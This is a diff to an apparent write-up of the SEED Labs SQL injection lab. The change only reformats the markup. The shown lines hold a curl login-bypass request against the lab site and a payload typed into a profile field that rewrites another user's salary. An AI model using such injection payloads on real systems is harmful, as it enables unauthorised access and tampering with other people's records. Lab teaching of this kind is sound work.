@@ -74,4 +74,4 @@ curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23
 <p>Log-in as Alice</p>
 <p>Assume instead of logging in as Boby using inject method, We keep the login in as Alice, and open Alice's profile edit page.</p>
 <p>We should change the Phone Number as</p> 
-<code>', Salary=1 where name='Boby' #</code>
+<pre><code>', Salary=1 where name='Boby' #</code></pre>
